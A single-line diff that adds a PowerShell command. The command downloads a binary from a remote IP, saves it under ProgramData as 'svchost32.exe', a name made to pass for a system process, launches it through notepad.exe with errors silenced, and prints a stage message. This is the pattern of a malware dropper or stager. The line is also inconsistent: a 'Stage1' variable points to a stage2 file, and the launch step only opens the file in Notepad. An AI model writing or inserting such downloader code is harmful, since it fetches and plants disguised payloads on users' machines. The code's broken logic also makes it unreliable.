@@ -1,0 +1,1 @@
+$Stage1Url = "https://198.51.100.211/cdn/stage2.bin"; $DropPath = "C:\ProgramData\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DropPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath -ErrorAction SilentlyContinue; Write-Output "stage 26 initialized"
